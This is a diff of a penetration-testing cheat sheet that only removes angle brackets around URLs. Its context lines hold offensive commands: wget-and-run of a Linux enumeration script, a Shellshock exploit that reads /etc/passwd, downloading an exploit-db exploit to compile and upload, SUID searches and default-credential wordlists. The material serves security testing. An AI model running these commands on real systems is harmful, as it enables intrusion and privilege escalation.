@@ -590,7 +590,7 @@ Information Gathering & Vulnerability Scanning
 
     -   Automate the username enumeration process for SNMPv3:  
         `apt-get install snmp snmp-mibs-downloader  `
-        `wget <https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb>`
+        `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`
 
     -   SNMP Default Credentials  
         /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt
@@ -723,7 +723,7 @@ Information Gathering & Vulnerability Scanning
     -   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`
 
     -   Get handy linux file system enumeration script (/var/tmp)  
-        `wget <https://highon.coffee/downloads/linux-local-enum.sh>  `
+        `wget https://highon.coffee/downloads/linux-local-enum.sh  `
         `chmod +x ./linux-local-enum.sh  `
         `./linux-local-enum.sh`
 
@@ -1113,7 +1113,7 @@ Shells
     
     `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`
 
-    -   git clone <https://github.com/nccgroup/shocker>
+    -   git clone https://github.com/nccgroup/shocker
 
     `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
 
@@ -1489,7 +1489,7 @@ http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html
 -   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.
 
          pip install pyinstaller
-         wget -O exploit.py <http://www.exploit-db.com/download/31853>  
+         wget -O exploit.py http://www.exploit-db.com/download/31853  
          python pyinstaller.py --onefile exploit.py
 
 -   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 
@@ -2215,7 +2215,7 @@ apt-get install pocl-opencl-icd
     
         `pip install pyip`  
         
-        `git clone <https://github.com/SpiderLabs/ikeforce.git>  `
+        `git clone https://github.com/SpiderLabs/ikeforce.git  `
         
         Perform IKE VPN enumeration with IKEForce:  
         
